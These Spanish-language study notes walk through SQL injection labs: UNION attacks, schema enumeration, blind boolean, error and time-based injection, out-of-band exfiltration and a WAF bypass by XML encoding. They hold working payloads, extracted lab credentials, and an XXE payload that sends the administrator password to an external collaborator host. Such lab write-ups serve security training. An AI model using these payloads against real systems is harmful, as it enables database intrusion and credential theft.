# Vulnerabilidad de inyección SQL en la cláusula WHERE que permite la recuperación de datos ocultos


# Vulnerabilidad de inyección SQL que permite omitir el inicio



# Ataque de inyección SQL, consulta del tipo y versión de la base de datos en Oracle

- Se intercepta la solicitud que filtra los productos por categoría y se modifica el parámetro ‘category’.
- Primero se determina cuántas columnas devuelve la consulta y cuáles aceptan datos de tipo texto. Esto es necesario para que el ataque UNION funcione correctamente.
- Una vez identificadas las columnas, se utiliza una inyección que consulta la tabla ‘v$version’, propia de Oracle, para obtener el valor del campo ‘BANNER’, que contiene información sobre la versión de la base de datos

Descubrir cuantas columnas tiene la consulta

**Se puede saber usando la propiedad order by numero_columna**

- order by 3
- order by 4
- etc

**Ejemplo**

filter?category=Lifestyle' order by 2 -- - 

filter?category=Lifestyle%27%20order%20by%202%20--%20- 

**Concantenar Select ORACLE** 

Lifestyle' union SELECT 'a','version' FROM dual -- -

Lifestyle%27%20union%20SELECT%20%27a%27,%27version%27%20FROM%20dual%20--%20-

Lifestyle%27%20union%20SELECT%20%27a%27,%27version%27%20FROM%20dual%20--%20-

Lifestyle%27%20union%20SELECT%20%27a%27,version20FROM%20V$VERSION%20--%20-

Lifestyle' union SELECT 'a',banner FROM v$version -- -

SELECT version FROM V$VERSION

SELECT%20version%20FROM%20V$VERSION

## Solucion

Lifestyle' union SELECT 'a',banner FROM v$version -- -

filter?category=Lifestyle%27%20union%20SELECT%20%27a%27,banner%20FROM%20v$version%20--%20-


# Laboratorio: Ataque de inyección SQL, consulta del tipo y versión de la base de datos en MySQL y Microsoft

## Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Puede utilizar un ataque UNION para recuperar los resultados de una consulta inyectada.

- Interceptar la solicitud con Burp Suite y probar distintas combinaciones hasta determinar el número de columnas que devuelve la consulta y cuáles aceptan texto. En este caso, son dos columnas de texto.
- Una vez identificadas, se usa la función ‘@@version‘, propia de MySQL y SQL Server, para extraer información del motor y su versión.
- El símbolo ‘#‘ se utiliza como comentario para anular el resto de la consulta original

**Ejemplo**

filter?category=Lifestyle' order by 2 -- - 

Lifestyle' union SELECT 'a','version' FROM dual -- -

## Solucion

Lifestyle' union SELECT 'a',@@version FROM dual -- -

Lifestyle%27%20union%20SELECT%201,@@version%20FROM%20dual%20--%20-



# Laboratorio: Ataque de inyección SQL, que enumera el contenido de la base de datos en bases de datos que no son de Oracle


Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación para que pueda utilizar un ataque UNION para recuperar datos de otras tablas.

La aplicación tiene una función de inicio de sesión y la base de datos contiene una tabla que contiene nombres de usuario y contraseñas. Debe determinar el nombre de esta tabla y las columnas que contiene, luego recuperar el contenido de la tabla para obtener el nombre de usuario y la contraseña de todos los usuarios.

Para resolver el laboratorio, inicie sesión como administrator usuario


- Descubrir cuántas columnas devuelve la consulta original y qué tipo de datos aceptan, usando un payload simple para comprobarlo.
Listar todas las tablas existentes en la base de datos consultando ‘information_schema.tables‘, una tabla especial que contiene metadatos.
- Identificar la tabla que almacena los usuarios y contraseñas, observando su nombre en la respuesta.
- Listar las columnas de esa tabla, consultando ‘information_schema.columns‘ y filtrando por el nombre de tabla que acabamos de encontrar.
Extraer los valores de las columnas relevantes, mostrando directamente los nombres de usuario y contraseñas de todos los usuarios.


**Ejemplo**

filter?category=Lifestyle' order by 2 -- - 

Lifestyle' union SELECT 'a','version' FROM dual -- -

### nombre de los esquemas 

' union SELECT null,schema_name FROM information_schema.schemata -- -

**Resultado**

-information_schema
-public
-pg_catalog

### nombres de las tablas 

' union SELECT null,table_name FROM information_schema.tables -- -


### Tablas de una base de datos 

' union SELECT table_name, null FROM information_schema.tables WHERE table_schema='public' -- -

**Resultado**

- users_acnzwu
- products


### Columnas de una tabla de una base de datos 

' union SELECT column_name, null FROM information_schema.columns  WHERE table_schema='public' and table_name='users_acnzwu'-- -

**Resultado**

- email
- password_nqwwgf
- username_huugjg

### Listar el contenido de las columnas de una tabla


' union SELECT username_huugjg, password_nqwwgf FROM public.users_acnzwu-- -

**Resultado**

carlos
r2snfvhtnxghlfy9gjjj

wiener
f2i4se6mb8bbz5qphi83

administrator
kdqrjyq5mdomujy5aewn


# Laboratorio: Ataque de inyección SQL, que enumera el contenido de la base de datos en Oracle

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación para que pueda utilizar un ataque UNION para recuperar datos de otras tablas.

La aplicación tiene una función de inicio de sesión y la base de datos contiene una tabla que contiene nombres de usuario y contraseñas. Debe determinar el nombre de esta tabla y las columnas que contiene, luego recuperar el contenido de la tabla para obtener el nombre de usuario y la contraseña de todos los usuarios.

Para resolver el laboratorio, inicie sesión como administrator usuario.


- Identificar el número de columnas y las que permiten mostrar texto en la respuesta, utilizando un payload simple como prueba.
- Listar todas las tablas disponibles usando la vista ‘all_tables‘, propia de Oracle.
- Localizar la tabla de usuarios, observando los resultados devueltos por la consulta inyectada.
- Consultar ‘all_tab_columns‘ para descubrir los nombres de las columnas de esa tabla.
- Obtener los valores de usuario y contraseña realizando una consulta directa sobre la tabla objetivo.


**Ejemplo**

Gifts' order by 2-- -

## Todas las tablas de oracle

' UNION SELECT table_name, null FROM all_tables -- 


### Nombres de las tablasd de Usuarios ORACLE

' UNION SELECT table_name, null FROM user_tables -- 

**Resultado**

- PRODUCTS
- USERS_PVOTTW

### Nombres de los campos de una tablas ORACLE

' union SELECT column_name,null FROM user_tab_columns WHERE table_name = 'USERS_PVOTTW' -- -

**Resultado**

- EMAIL
- PASSWORD_NSMTLG
- USERNAME_PPFZRD

### Listar el contenido de las columnas de una tabla


' union SELECT USERNAME_PPFZRD ,PASSWORD_NSMTLG FROM USERS_PVOTTW -- -

**Resultado**

- administrator   ogm60ocedq7vizcjf1bh
- carlos   kz0geyp5jom1zckc114j
- wiener  yxch5fw8dvpv5yovsks7







# Laboratorio: ataque UNION de inyección SQL, que determina el número de columnas devueltas por la consulta

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puede utilizar un ataque UNION para recuperar datos de otras tablas. El primer paso de un ataque de este tipo es determinar la cantidad de columnas que devuelve la consulta. Luego utilizarás esta técnica en laboratorios posteriores para construir el ataque completo.

Para resolver el laboratorio, determine la cantidad de columnas devueltas por la consulta realizando un ataque UNION de inyección SQL que devuelve una fila adicional que contiene valores nulos.


-Se intercepta la solicitud y se prueba un payload con ‘UNION SELECT NULL‘.
-Si el número de columnas no coincide, la base de datos devolverá un error.
-Se van añadiendo valores ‘NULL‘ separados por comas (por ejemplo, NULL, NULL, luego NULL, NULL, NULL, etc.) hasta que la respuesta deje de mostrar error y aparezca contenido nuevo.

**Ejemplo**

Gifts' order by 2-- -


' union SELECT null ,null,null -- -







# Laboratorio: ataque UNION de inyección SQL, búsqueda de una columna que contiene texto

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puede utilizar un ataque UNION para recuperar datos de otras tablas. Para construir un ataque de este tipo, primero es necesario determinar la cantidad de columnas devueltas por la consulta. Puedes hacer esto usando una técnica que aprendiste en un laboratorio anterior. El siguiente paso es identificar una columna que sea compatible con datos de cadena.

El laboratorio proporcionará un valor aleatorio que deberá hacer aparecer dentro de los resultados de la consulta. Para resolver el laboratorio, realice un ataque UNION de inyección SQL que devuelva una fila adicional que contenga el valor proporcionado. Esta técnica le ayuda a determinar qué columnas son compatibles con los datos de cadena.

- Primero se confirma cuántas columnas tiene la consulta, como ya se hizo en el laboratorio anterior.
- Luego se utiliza un valor aleatorio proporcionado por el propio laboratorio (como “abcdef”) y se prueba colocándolo en cada una de las posiciones ‘NULL‘ del payload, una a una.
- Si el valor aparece en la respuesta, significa que esa columna acepta datos tipo texto y puede usarse para mostrar información en futuras inyecciones.


**Ejemplo**

Gifts' order by 3-- -


' union SELECT null,'G0Puak',null -- -












# Laboratorio: ataque UNION de inyección SQL, recuperación de datos de otras tablas

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puede utilizar un ataque UNION para recuperar datos de otras tablas. Para construir un ataque de este tipo, es necesario combinar algunas de las técnicas que aprendiste en laboratorios anteriores.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y password.

Para resolver el laboratorio, realice un ataque UNION de inyección SQL que recupere todos los nombres de usuario y contraseñas, y use la información para iniciar sesión como administrator usuario.

Los pasos clave son:

- Verificar cuántas columnas tiene la consulta original y cuáles aceptan texto, tal como se vio en los labs anteriores.
- Una vez identificado eso, se construye un payload que sustituye la consulta original por una que seleccione directamente los valores de las columnas ‘username‘ y ‘password‘ desde la tabla ‘users‘.
- Al inyectar correctamente la consulta, la respuesta mostrará las credenciales de todos los usuarios, incluida la del administrador.


**Ejemplo**

' order by 3-- -


### nombre de los esquemas 

' union SELECT null,schema_name FROM information_schema.schemata -- -

**Resultado**

-information_schema
-public
-pg_catalog

### nombres de las tablas 

' union SELECT null,table_name FROM information_schema.tables -- -


### Tablas de una base de datos 

' union SELECT null,table_name FROM information_schema.tables WHERE table_schema='public' -- -


**Resultado**

- users
- products

### Columnas de una tabla de una base de datos 

' union SELECT null,column_name FROM information_schema.columns  WHERE table_schema='public' and table_name='users'-- -

**Resultado**

- email
- password
- username

### Listar el contenido de las columnas de una tabla


' union SELECT null,username||'-'||password FROM public.users-- -

**Resultado**


- wiener-3xl0w0hq87bc29ve4e8z
- carlos-vhjeruhx9kf4yqrmo0hq
- administrator-p1q9m1m3yg1lmnh4l30s






# Inyección SQL ciega con respuestas condicionales

## Laboratorio: Inyección SQL ciega con respuestas condicionales

Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.

No se devuelven los resultados de la consulta SQL y no se muestran mensajes de error. Pero la solicitud incluye una Welcome back mensaje en la página si la consulta devuelve alguna fila.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y password. Debe aprovechar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del administrator usuario.

Para resolver el laboratorio, inicie sesión como administrator usuario.


Usamos esta técnica para:

- Confirmar la existencia de una tabla ‘users‘ y un usuario ‘administrator‘.
- Determinar la longitud exacta de la contraseña del administrador.
- Extraer el valor carácter por carácter usando funciones como ‘SUBSTRING‘.


Este tipo de ataque requiere paciencia y precisión, ya que no vemos los datos directamente, pero con herramientas como Burp Repeater e Intruder, es posible automatizar gran parte del proceso.

### Saber el tamano de la constrasena


' and (select 'a' from users where username='administrator' and length(password)=20 )='a'


' and (select substring(password,1,1) from users where username='administrator')='a'



administrator  48rgszdjihweim2hstf4


- 01-Blind_SQL_conditional_responses.py








# Inyección SQL ciega con errores condicionales

## Laboratorio: Inyección SQL ciega con errores condicionales

Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.

Los resultados de la consulta SQL no se devuelven y la aplicación no responde de manera diferente según si la consulta devuelve alguna fila. Si la consulta SQL provoca un error, la aplicación devuelve un mensaje de error personalizado.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y password. Debe aprovechar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del administrator usuario.

Para resolver el laboratorio, inicie sesión como administrator usuario.


La vulnerabilidad se encuentra en una cookie de seguimiento (TrackingId). La aplicación no muestra directamente los resultados de la consulta, pero sí muestra una respuesta distinta si se provoca un error en la ejecución de la consulta SQL.

Aprovechamos esto para:

- Confirmar que la consulta es vulnerable a inyección.
- Verificar que existe una tabla ‘users‘ y un usuario ‘administrator‘.
- Descubrir la longitud de la contraseña del administrador.
- Extraer la contraseña carácter por carácter, forzando errores solo cuando la condición evaluada es verdadera.

Para provocar errores intencionados, se usa la función ‘TO_CHAR(1/0)‘ (división por cero en Oracle), dentro de expresiones ‘CASE WHEN‘ que evalúan condiciones booleanas. La idea es generar un error solo cuando la condición se cumple, lo que permite inferir información sin necesidad de ver los resultados directamente.

En esta clase continuamos con la explotación de la inyección SQL ciega basada en errores, utilizando las técnicas que vimos anteriormente para completar el proceso de extracción del password del administrador.

Aplicamos lo aprendido para automatizar la obtención de cada carácter de la contraseña utilizando Burp Intruder, apoyándonos en respuestas con error (código 500) para saber si el carácter probado es correcto. Se recorre así toda la cadena de forma sistemática.

**Oracle**

### Tamano de la constrasena

' order by 1 -- -


' union select '1' from dual -- -


' || (select '1' from dual) || '


'|| (select case when length(password)> 21 then to_char(1/0) else '' and from users where username='administrator')||'


### Constrasena


'|| (select case when substr(password,1,1)='c' then to_char(1/0) else '' and from users where username='administrator')||'




administrator  ir5irznuql3pyv7hexn8







# Inyección SQL basada en errores visibles

## Laboratorio: Inyección SQL visible basada en errores

Este laboratorio contiene una vulnerabilidad de inyección SQL. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada. Los resultados de la consulta SQL no se devuelven.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y password. Para resolver el laboratorio, encuentre una manera de filtrar la contraseña del administrator usuario, luego inicie sesión en su cuenta.


Analizamos paso a paso cómo:

- Provocar un error de sintaxis añadiendo un carácter de comilla.
- Comentar el resto de la consulta para validarla sintácticamente.
- Utilizar subconsultas SQL combinadas con ‘CAST‘ para extraer información.
- Ajustar la consulta para obtener solo una fila y evitar errores de tipo.
- Filtrar primero el nombre de usuario del administrador y después su contraseña.



- ' or 1= cast((select username from users limit 1 ) as INT)-- -

- ' or 1= cast((select password from users limit 1) as INT)-- -



r73iz9oletj5j3ddim27







# Inyección SQL ciega mediante retrasos temporales

## Laboratorio: Inyección SQL ciega con retrasos de tiempo

Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.

Los resultados de la consulta SQL no se devuelven y la aplicación no responde de manera diferente según si la consulta devuelve alguna fila o causa un error. Sin embargo, dado que la consulta se ejecuta sincrónicamente, es posible desencadenar retrasos de tiempo condicionales para inferir información.

Para resolver el laboratorio, aproveche la vulnerabilidad de inyección SQL para provocar un retraso de 10 segundos.


La aplicación no muestra errores ni cambios en la respuesta al procesar la cookie ‘TrackingId‘, pero ejecuta las consultas de forma síncrona.

- Aprovechamos este comportamiento para inyectar una función de retardo (pg_sleep) y medir el tiempo de respuesta del servidor. Si la consulta tarda en responder, podemos deducir que se ha ejecutado correctamente.


' || pg_sleep(10) -- -










# Inyección SQL ciega con retrasos y exfiltración de datos 

## Laboratorio: Inyección SQL ciega con retrasos de tiempo y recuperación de información

Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.

Los resultados de la consulta SQL no se devuelven y la aplicación no responde de manera diferente según si la consulta devuelve alguna fila o causa un error. Sin embargo, dado que la consulta se ejecuta sincrónicamente, es posible desencadenar retrasos de tiempo condicionales para inferir información.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y password. Debe aprovechar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del administrator usuario.

Para resolver el laboratorio, inicie sesión como administrator usuario.


- Partimos de una cookie ‘TrackingId‘ vulnerable que se inserta directamente en una consulta SQL. Aprovechamos esta inyección para condicionar la ejecución de la función ‘pg_sleep‘ en función del resultado de la consulta. Si la condición se cumple, la aplicación se retrasa; si no, responde al instante.

- Inicialmente verificamos si existe el usuario ‘administrator‘. A partir de ahí, inferimos la longitud exacta de su contraseña mediante condiciones incrementales como ‘LENGTH(password)>n‘, observando el tiempo de respuesta.

- Una vez conocida la longitud (20 caracteres), automatizamos el proceso con Burp Intruder, utilizando ‘SUBSTRING()‘ para probar carácter por carácter. Configuramos los ataques para ejecutarse en un solo hilo y comparamos los tiempos de respuesta para identificar los caracteres correctos.


- Partimos desde el punto en el que ya conocemos la longitud de la contraseña del usuario ‘administrator‘. Ahora nos centramos en automatizar por completo la recuperación del valor de cada carácter que la compone, utilizando Burp Intruder para iterar de forma sistemática por todas las posiciones y valores posibles (letras minúsculas y números).

- Se configura un ataque por cada posición de la contraseña, adaptando la consulta con ‘SUBSTRING(password, n, 1)‘ y analizando el retardo en la respuesta para identificar el carácter correcto. Cada vez que se produce una demora significativa (≈10 segundos), se confirma que el carácter probado es el correcto.

**EJEMPLO**


' || pg_sleep(10) -- -



%3b  --> Exadecimal   ---> ;



' %3b select case when length(password)=20 then pg_sleep(5) else null end from users where username='administrator' -- -

'%3b select case when(username='administrator' and length(password)=20) then pg_sleep(5) else pg_sleep(0) en from users -- -


' %3b select case when  substring(password,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from users where username='administrator' -- -

'%3b select case when(username='administrator' and substring(password,1,1)='a' ) then pg_sleep(5) else pg_sleep(0) en from users -- -




and (select substr(password,1,1) from users where username='administrator')='a'
 'or (select case when substring(password,1,1)='a' then pg_sleep(10) else pg_sleep(0) end from users where username = 'administrator') is not null-- -











# Inyección SQL ciega con interacción out-of-band (OOB)

## Laboratorio: Inyección SQL ciega con interacción fuera de banda

Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.

La consulta SQL se ejecuta de forma asincrónica y no tiene ningún efecto sobre la respuesta de la aplicación. Sin embargo, puede desencadenar interacciones fuera de banda con un dominio externo.

Para resolver el laboratorio, aproveche la vulnerabilidad de inyección SQL para provocar una búsqueda de DNS en Burp Collaborator.



- La vulnerabilidad reside en la cookie ‘TrackingId‘, que es inyectada en una consulta SQL. Aprovechamos esta situación para insertar un payload que provoca una resolución DNS hacia un dominio controlado, utilizando la funcionalidad de Burp Collaborator.

- Combinamos la inyección SQL con una entidad externa en XML (XXE) que genera una solicitud automática a un subdominio de Collaborator, confirmando así que la inyección fue ejecutada aunque no haya evidencia directa en la respuesta HTTP.




SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %25remote%3b]>'),'/l') FROM dual





# Exfiltración de datos por canal OOB en Inyección SQL

## Laboratorio: Inyección SQL ciega con exfiltración de datos fuera de banda

Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.

La consulta SQL se ejecuta de forma asincrónica y no tiene ningún efecto sobre la respuesta de la aplicación. Sin embargo, puede desencadenar interacciones fuera de banda con un dominio externo.

La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y password. Debe aprovechar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del administrator usuario.

Para resolver el laboratorio, inicie sesión como administrator usuario.



- La vulnerabilidad se encuentra nuevamente en la cookie ‘TrackingId‘, donde inyectamos un payload que construye dinámicamente una petición DNS hacia un subdominio de Burp Collaborator. En este caso, concatenamos la contraseña del usuario ‘administrator‘ dentro de la URL del dominio, de modo que dicha información se filtre al servidor externo.

- El ataque utiliza funciones de XML como ‘EXTRACTVALUE‘ y el tipo ‘xmltype‘, combinadas con subconsultas SQL (SELECT password FROM users WHERE username=’administrator’) que inyectan el dato como parte de la resolución DNS.

- Finalmente, desde la pestaña Collaborator de Burp Suite, verificamos las interacciones registradas y recuperamos el valor exfiltrado. Con esta contraseña accedemos como administrador y resolvemos el laboratorio.


Cookie: TrackingId=OM2UeUHT1Q74XfV4" union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25
remote SYSTEM "http://'||(select password from users where username='administrator')||'.em4651c8ntonsu7rwg3gtectkkqce52u.oastify.com/">
%25remote%3b]>"),'/1') FROM dual--     

session=GknxCGss@6A1lpHSaxkE1ZY91z6sfhXrU









# Bypass de filtros con codificación XML en Inyección SQL

## Laboratorio: Inyección SQL con omisión de filtro mediante codificación XML

Este laboratorio contiene una vulnerabilidad de inyección SQL en su función de verificación de stock. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puede utilizar un ataque UNION para recuperar datos de otras tablas.

La base de datos contiene un users tabla, que contiene los nombres de usuario y contraseñas de los usuarios registrados. Para resolver el laboratorio, realice un ataque de inyección SQL para recuperar las credenciales del usuario administrador y luego inicie sesión en su cuenta.


- Inicialmente identificamos que el valor de ‘storeId‘ es evaluado por el backend, permitiendo realizar operaciones como ‘1+1‘. Luego intentamos una inyección clásica mediante ‘UNION SELECT‘, pero la aplicación bloquea el intento, presumiblemente por un sistema WAF (Web Application Firewall).

- Para evadir este filtro, aplicamos codificación de entidades XML (por ejemplo, hexadecimal o decimal), utilizando herramientas como la extensión Hackvertor en Burp Suite. Este bypass permite que el payload pase desapercibido y sea ejecutado por el backend.

- A través de prueba y error, determinamos que la consulta original solo permite devolver una columna, por lo que concatenamos ‘username‘ y ‘password‘ con un separador (~) para extraer los datos de la tabla ‘users‘ en una sola columna.



<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>5</productId><storeId>1 order by 1</storeId></stockCheck>



(select password from users where username='administrator')

**Usar la extension Hackvertor**



<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>5</productId>
<storeId>
    <@hex_entities>1 union select password from users where username='administrator'</@hex_entities>
</storeId>
</stockCheck>




https://infosecmachines.io/